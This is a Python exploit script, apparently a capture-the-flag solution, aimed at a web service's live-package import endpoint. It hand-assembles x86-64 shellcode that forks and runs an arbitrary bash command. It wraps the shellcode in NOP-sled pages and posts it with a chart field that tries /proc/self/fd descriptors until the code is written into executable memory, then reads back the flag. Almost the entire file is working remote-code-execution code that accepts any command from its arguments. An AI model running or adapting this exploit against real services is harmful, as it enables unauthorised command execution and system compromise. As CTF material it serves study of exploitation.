#!/usr/bin/env python3
import base64
import sys
import time

import requests


PAGE_SIZE = 4096
DEFAULT_COMMAND = "/readflag > /app/exports/flag.txt"


def build_shellcode(command):
    command_bytes = command.encode() + b"\x00"
    labels = {}
    patches = []
    code = bytearray()

    def emit(data):
        code.extend(data)

    def label(name):
        labels[name] = len(code)

    def lea(reg_opcode, name):
        emit(b"\x48\x8d" + bytes([reg_opcode]))
        patches.append((len(code), name))
        emit(b"\x00\x00\x00\x00")

    emit(bytes.fromhex(
        "554889e5"          # push rbp; mov rbp, rsp
        "b8390000000f05"    # fork()
        "85c07404"          # if child, jump forward
        "31c05dc3"          # parent: return 0
    ))

    lea(0x1d, "binbash")    # rbx = "/bin/bash"
    lea(0x0d, "arg0")       # rcx = "bash"
    lea(0x15, "arg1")       # rdx = "-c"
    lea(0x35, "command")    # rsi = command
    emit(bytes.fromhex(
        "31c0"              # xor eax, eax
        "50"                # argv[3] = NULL
        "56"                # argv[2] = command
        "52"                # argv[1] = "-c"
        "51"                # argv[0] = "bash"
        "4889e6"            # rsi = argv
        "31d2"              # envp = NULL
        "4889df"            # rdi = "/bin/bash"
        "b83b0000000f05"    # execve
        "b83c000000bf010000000f05"  # exit(1) if execve fails
    ))

    label("binbash")
    emit(b"/bin/bash\x00")
    label("arg0")
    emit(b"bash\x00")
    label("arg1")
    emit(b"-c\x00")
    label("command")
    emit(command_bytes)

    for offset, name in patches:
        disp = labels[name] - (offset + 4)
        code[offset:offset + 4] = int(disp).to_bytes(4, "little", signed=True)

    if len(code) > PAGE_SIZE - 16:
        raise ValueError("command is too long for the page payload")

    return bytes(code)


def build_payload(command):
    shellcode = build_shellcode(command)
    page_payload = (b"\x90" * (PAGE_SIZE - len(shellcode) - 16)) + shellcode + (b"\x90" * 16)
    return page_payload * 2048


def request(base, path, data=None, timeout=3):
    if data is not None:
        resp = requests.post(base + path, json=data, timeout=timeout)
    else:
        resp = requests.get(base + path, timeout=timeout)

    resp.raise_for_status()
    return resp.content


def wait_ready(base):
    for _ in range(40):
        try:
            request(base, "/healthz", timeout=1)
            return
        except Exception:
            time.sleep(0.25)
    raise RuntimeError("target did not become ready")


def try_read_flag(base):
    try:
        flag = request(base, "/sekai/replays/flag.txt", timeout=1).decode(errors="replace").strip()
        if flag:
            return flag
    except Exception:
        return None
    return None


def poll_after_write(base):
    for _ in range(12):
        try:
            request(base, "/healthz", timeout=1)
        except Exception:
            pass

        flag = try_read_flag(base)
        if flag:
            return flag

        time.sleep(0.25)

    return None


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8089"
    command = " ".join(sys.argv[2:]) if len(sys.argv) > 2 else DEFAULT_COMMAND
    verify_flag = command == DEFAULT_COMMAND
    wait_ready(base)

    body = base64.b64encode(build_payload(command)).decode()
    candidates = [8] + [fd for fd in range(3, 80) if fd != 8]
    for fd in candidates:
        chart = f"x;b64;false;/proc/self/fd/{fd}"
        try:
            request(base, "/api/sekai/live-package/import", {
                "name": "x",
                "body": body,
                "chart": chart
            }, timeout=5)
        except Exception:
            pass

        wait_ready(base)

        if not verify_flag:
            print(f"sent command through fd {fd}: {command}")
            return

        flag = poll_after_write(base)
        if flag:
            print(flag)
            return

    raise RuntimeError("failed to find the doublemapper fd")


if __name__ == "__main__":
    main()
